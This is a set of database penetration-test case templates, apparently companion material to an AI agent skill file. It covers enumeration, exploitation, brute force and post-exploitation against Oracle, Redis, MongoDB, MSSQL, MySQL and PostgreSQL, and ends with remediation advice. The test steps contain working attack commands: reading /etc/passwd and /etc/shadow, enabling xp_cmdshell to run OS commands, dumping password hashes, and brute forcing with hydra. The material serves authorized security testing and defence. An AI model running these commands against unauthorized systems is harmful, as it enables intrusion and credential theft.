# Database Attack Test Cases

> This file is a companion to `SKILL.md`, providing structured database attack test case templates.
> Purpose: Check each item during penetration testing to ensure no critical database attack vectors are missed. Each case includes prerequisites, steps, expected results, and severity level.
> All tests are intended solely for authorized security assessments.

---

## Test Case Format

```
TC-DBXXX | [Category] Test Name
Severity: CRITICAL / HIGH / MEDIUM / LOW
Prerequisites: Conditions that must be met before testing
Test Steps: Specific operations
Expected Results: Observable behavior when the vulnerability exists
Reference Payload: Corresponding section in payloads.md
```

---

## Index

- [A. Enumeration](#a-enumeration)
- [B. Exploitation](#b-exploitation)
- [C. Brute Force](#c-brute-force)
- [D. Post-Exploitation](#d-post-exploitation)

---

## A. Enumeration

### TC-DB001 | Oracle TNS Listener Enumeration

- **Severity**: HIGH
- **Objective**: Enumerate Oracle TNS listener properties and discover valid SIDs for further exploitation
- **Prerequisites**: Oracle TNS listener detected on port 1521 (via nmap or network scan)
- **Test Steps**:
  1. Run `oscanner -s 192.168.1.100` to enumerate TNS listener properties
  2. Run `odat sidguesser -s 192.168.1.100 -p 1521` to brute-force valid SIDs
  3. Record discovered SIDs, listener version, and running services
  4. Test connectivity to each discovered SID
- **Expected Results**: oscanner reveals Oracle version and running services; odat identifies one or more valid SIDs (ORCL, XE, PROD, etc.)
- **Reference**: payloads.md section 1 — Oracle Attacks

### TC-DB002 | Redis Unauthenticated Access Check

- **Severity**: CRITICAL
- **Objective**: Verify whether Redis instances are accessible without authentication and extract configuration data
- **Prerequisites**: Redis service detected on port 6379
- **Test Steps**:
  1. Run `redis-cli -h 192.168.1.100 INFO server` without credentials
  2. If successful, run `redis-cli -h 192.168.1.100 INFO keyspace` to check databases
  3. Run `redis-cli -h 192.168.1.100 CONFIG GET requirepass` to check authentication setting
  4. Run `redis-cli -h 192.168.1.100 KEYS '*'` to enumerate keys
  5. Check configuration paths: `CONFIG GET dir` and `CONFIG GET dbfilename`
- **Expected Results**: Unauthenticated access returns server information, keyspace data, and configuration — indicates Redis is exposed without authentication
- **Reference**: payloads.md section 5 — Redis Exploitation

### TC-DB003 | MongoDB Unauthenticated Access and Audit

- **Severity**: CRITICAL
- **Objective**: Test for unauthenticated MongoDB access and perform a comprehensive security audit
- **Prerequisites**: MongoDB service detected on port 27017
- **Test Steps**:
  1. Run `mongo --host 192.168.1.100 --eval "db.adminCommand('listDatabases')"` without credentials
  2. Run `mongoaudit -h 192.168.1.100 -p 27017` for full security assessment
  3. Enumerate databases, collections, and document counts
  4. Check server status: `db.adminCommand({getCmdLineOpts: 1})`
  5. Test for JavaScript execution: `db.eval('function(){return 1}')`
- **Expected Results**: Unauthenticated access lists all databases; mongoaudit reports misconfigurations including missing authentication, excessive privileges, and exposed interfaces
- **Reference**: payloads.md section 6 — MongoDB Attacks

---

## B. Exploitation

### TC-DB004 | Oracle Exploitation with odat

- **Severity**: CRITICAL
- **Objective**: Exploit Oracle database access to achieve file read, OS command execution, and credential extraction
- **Prerequisites**: Valid Oracle SID and credentials (from brute-force or default testing)
- **Test Steps**:
  1. Run `odat all -s 192.168.1.100 -d ORCL -U sys -P change_on_install` for full module scan
  2. Test file read: `odat utlfile --getFile /etc/passwd`
  3. Test OS command execution: `odat dbmsscheduler --exec "id"`
  4. Extract password hashes: `odat passwordstealer`
  5. Enumerate database links: `odat dblink`
  6. Test Java execution capability: `odat java`
- **Expected Results**: odat successfully reads files from the OS, executes commands, extracts credential hashes, and identifies database links for lateral movement
- **Reference**: payloads.md section 1 — Oracle Attacks

### TC-DB005 | MSSQL OS Command Execution via xp_cmdshell

- **Severity**: CRITICAL
- **Objective**: Achieve OS command execution on the database server through MSSQL xp_cmdshell and extract credentials
- **Prerequisites**: Valid MSSQL credentials (preferably sysadmin role)
- **Test Steps**:
  1. Connect with sqsh: `sqsh -S 192.168.1.100 -U sa -P 'password'`
  2. Enable xp_cmdshell: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE`
  3. Execute test command: `xp_cmdshell 'whoami'`
  4. Execute: `xp_cmdshell 'hostname && ipconfig /all'` (Windows) or `xp_cmdshell 'id && ifconfig'` (Linux)
  5. Extract password hashes: `SELECT name, password_hash FROM sys.sql_logins`
  6. Check linked servers: `SELECT name, data_source FROM sys.servers`
- **Expected Results**: xp_cmdshell returns OS command output; password hashes are extractable; linked servers identified for pivot
- **Reference**: payloads.md section 4 — MSSQL/Sybase Attacks

---

## C. Brute Force

### TC-DB006 | MySQL Multi-User Brute-Force

- **Severity**: HIGH
- **Objective**: Discover valid MySQL credentials through automated brute-force attacks against multiple usernames
- **Prerequisites**: MySQL service detected on port 3306, prepared user and password lists
- **Test Steps**:
  1. Test default credentials manually: root with empty password, root/root
  2. Run `hydra -L users.txt -P passwords.txt mysql://192.168.1.100 -t 4 -W 3`
  3. Run `patator mysql_login host=192.168.1.100 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -t 4`
  4. Verify discovered credentials by connecting: `mysql -h 192.168.1.100 -u user -p'password'`
- **Expected Results**: hydra or patator discover valid credentials within the wordlist; manual connection confirms access
- **Reference**: payloads.md section 2 and section 7 — MySQL and Multi-Protocol Brute Force

### TC-DB007 | MSSQL sa Account Brute-Force

- **Severity**: HIGH
- **Objective**: Crack the MSSQL sa (system administrator) account password through brute-force to gain sysadmin access
- **Prerequisites**: MSSQL service detected on port 1433, prepared password list
- **Test Steps**:
  1. Test empty sa password: `sqsh -S 192.168.1.100 -U sa -P '' -C "SELECT 1"`
  2. Run `hydra -l sa -P passwords.txt mssql://192.168.1.100 -t 4`
  3. Run `ncrack -p 1433 192.168.1.100 -u sa -P passwords.txt`
  4. Verify discovered credentials with sqsh
- **Expected Results**: sa password is cracked; sqsh connection succeeds; sysadmin role confirmed
- **Reference**: payloads.md section 4 and section 7 — MSSQL and Multi-Protocol Brute Force

---

## D. Post-Exploitation

### TC-DB008 | PostgreSQL Privilege Escalation and File Access

- **Severity**: CRITICAL
- **Objective**: Escalate PostgreSQL access to read OS files and execute commands through PL languages and large object support
- **Prerequisites**: Valid PostgreSQL credentials (standard user or superuser)
- **Test Steps**:
  1. Check current role: `SELECT current_user, session_user, is_superuser`
  2. List available languages: `SELECT lanname FROM pg_language`
  3. If superuser, read files via COPY: `COPY (SELECT 1) TO PROGRAM 'cat /etc/passwd'`
  4. If PL/Python available, create and call exec function for OS commands
  5. If PL/Perl available, use plperl for OS command execution
  6. Check for large object support: `SELECT lo_create(0)` then `lo_import('/etc/shadow')`
  7. Enumerate all roles and their attributes: `SELECT rolname, rolsuper, rolcreaterole FROM pg_roles`
- **Expected Results**: File contents readable via COPY or lo_import; OS commands executable via PL languages; all roles enumerated for further exploitation
- **Reference**: payloads.md section 3 — PostgreSQL Attacks

---

## Test Case Statistics

| Category | Cases | CRITICAL | HIGH | MEDIUM | LOW |
|----------|-------|----------|------|--------|-----|
| A. Enumeration | 3 | 2 | 1 | 0 | 0 |
| B. Exploitation | 2 | 2 | 0 | 0 | 0 |
| C. Brute Force | 2 | 0 | 2 | 0 | 0 |
| D. Post-Exploitation | 1 | 1 | 0 | 0 | 0 |
| **Total** | **8** | **5** | **3** | **0** | **0** |

---

## Remediation Summary

### Oracle Defense

- Disable default accounts (sys/change_on_install, scott/tiger); enforce strong passwords
- Restrict TNS listener to specific IPs; enable listener authentication
- Revoke unnecessary privileges (UTL_FILE, DBMS_SCHEDULER, JAVA) from non-admin users

### MySQL/MariaDB Defense

- Remove empty root password; enforce authentication for all accounts
- Restrict FILE privilege to essential administrative accounts only
- Disable remote root access; use socket authentication for local admin

### PostgreSQL Defense

- Use md5 or scram-sha-256 authentication instead of trust
- Revoke COPY TO PROGRAM from non-superusers
- Disable untrusted PL languages (plpythonu, plperlu) unless required

### MSSQL Defense

- Disable xp_cmdshell unless explicitly required by applications
- Use integrated Windows authentication instead of SQL authentication where possible
- Enforce password complexity and lockout policies for SQL logins

### Redis Defense

- Set requirepass in redis.conf; use ACLs for fine-grained access control
- Bind to localhost or specific interfaces only; block external access with firewall
- Disable CONFIG SET for non-admin connections using rename-command

### MongoDB Defense

- Enable authentication with keyFile or x.509 certificates
- Disable JavaScript execution (db.eval) in production
- Enable role-based access control with least-privilege principle

---

## Pass Criteria Checklist

- [ ] All database services identified and version information extracted
- [ ] Unauthenticated access tested and documented for each database type
- [ ] Default credentials tested and cracked credentials verified
- [ ] File read/write operations confirmed where privileges allow
- [ ] OS command execution achieved through database features
- [ ] Password hashes extracted and cracking attempted
- [ ] Linked servers and database cross-references enumerated for lateral movement
